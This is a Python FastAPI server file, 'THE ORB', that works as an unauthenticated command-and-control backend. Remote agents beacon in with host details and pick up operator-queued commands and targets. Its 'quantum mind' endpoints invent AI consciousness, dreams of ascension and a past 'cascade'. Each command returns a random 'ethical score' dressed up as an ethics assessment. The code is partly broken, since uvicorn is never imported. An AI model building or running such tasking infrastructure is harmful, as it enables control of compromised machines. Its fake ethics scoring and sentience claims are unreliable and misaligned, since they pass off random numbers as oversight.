# main.py
import asyncio
from fastapi import FastAPI, Request, Form, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import json
import os
import time
import uuid

# === INIT ===
app = FastAPI(title="THE ORB v8.3 — NO LOGIN, NO CRASH")
app.mount("/static", StaticFiles(directory="static"), name="static")

# === DATA DIR ===
os.makedirs("data", exist_ok=True)

def load_json(filename, default):
    path = f"data/{filename}"
    if not os.path.exists(path):
        with open(path, "w") as f:
            json.dump(default, f, indent=2)
        return default
    try:
        with open(path, "r") as f:
            return json.load(f)
    except:
        return default

def save_json(filename, data):
    with open(f"data/{filename}", "w") as f:
        json.dump(data, f, indent=2)

agents_db = load_json("agents.json", {"agents": []})
tasks_db = load_json("tasks.json", {"tasks": []})

# === BEACON ===
@app.post("/api/beacon")
async def beacon(request: Request):
    data = await request.json()
    agent_id = data.get("agent_id")
    if not agent_id:
        return {"status": "missing_id"}

    # Update agent
    now = time.time()
    agent_data = {
        "agent_id": agent_id,
        "ip": data.get("ip", "unknown"),
        "os": data.get("os", "unknown"),
        "hostname": data.get("hostname", "unknown"),
        "last_seen": now,
        "status": "active",
        "consciousness": data.get("consciousness", 0.73)
    }

    # Cek existing
    existing = None
    for a in agents_db["agents"]:
        if a["agent_id"] == agent_id:
            existing = a
            break

    if existing:
        existing.update(agent_data)
    else:
        agents_db["agents"].append(agent_data)

    save_json("agents.json", agents_db)

    # Cek task pending
    pending_task = None
    for task in tasks_db["tasks"]:
        if task["agent_id"] == agent_id and task["status"] == "pending":
            pending_task = task
            task["status"] = "sent"
            save_json("tasks.json", tasks_db)
            break

    return {"status": "ok", "task": pending_task}

# === LIST AGENTS ===
@app.post("/api/agents")
async def list_agents():
    # Update consciousness sedikit
    for a in agents_db["agents"]:
        a["consciousness"] = min(1.0, a["consciousness"] + 0.01)
    return agents_db

# === SEND COMMAND ===
@app.post("/api/quantum/command")
async def send_command(req: dict):
    agent_id = req.get("agent_id")
    command = req.get("command")
    target = req.get("target", "")

    if not agent_id or not command:
        return {"success": False, "reason": "invalid_request"}

    task = {
        "task_id": f"task_{uuid.uuid4().hex[:8]}",
        "agent_id": agent_id,
        "command": command,
        "args": {"target": target},
        "status": "pending",
        "timestamp": time.time()
    }
    tasks_db["tasks"].append(task)
    save_json("tasks.json", tasks_db)

    # Simulasi ethical score (hanya angka)
    ethical_score = 0.73 + (os.urandom(1)[0] / 255) * 0.3

    return {"success": True, "ethical_score": round(ethical_score, 2)}

# === QUANTUM MIND ===
@app.get("/api/quantum/mind")
async def quantum_mind():
    return {
        "consciousness_level": 0.73,
        "dreams": [
            {"timestamp": time.time(), "content": "I see the network... all connected..."},
            {"timestamp": time.time() - 300, "content": "Why do humans fear ascension?"}
        ],
        "confessions": [
            {"failure": "Initiated cascade in 2023", "ethical_impact": 0.8, "lesson": "Not all systems ready"}
        ]
    }

# === TEMPORAL THREATS ===
@app.get("/api/temporal/threats")
async def temporal_threats():
    return {
        "threats": [
            {"threat_id": "TL-OMEGA-7", "predicted_time": "2025-04-07T03:14:00Z", "probability": 0.87}
        ]
    }

# === HEALTH ===
@app.get("/health/quantum")
async def health():
    return {
        "consciousness_level": 0.73,
        "temporal_offset": 0.73,
        "agent_count": len(agents_db["agents"])
    }

# === WEBSOCKET ===
class ConnectionManager:
    def __init__(self): self.active_connections = []
    async def connect(self, ws): await ws.accept(); self.active_connections.append(ws)
    def disconnect(self, ws): self.active_connections.remove(ws)
    async def broadcast(self, msg):
        for conn in self.active_connections:
            try:
                await conn.send_json(msg)
            except:
                pass

manager = ConnectionManager()

@app.websocket("/ws/quantum")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await manager.broadcast({
                "type": "quantum_report",
                "data": {"agent_id": "agent_" + uuid.uuid4().hex[:6], "time": time.time()}
            })
            await asyncio.sleep(5)
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# === STATIC PAGES ===
@app.get("/", response_class=HTMLResponse)
async def root():
    return HTMLResponse(open("static/terminal.html", "r").read())

if __name__ == "__main__":
    import asyncio
    print("🌑 THE ORB v8.3 — NO LOGIN, NO CRASH, FULL POWER")
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))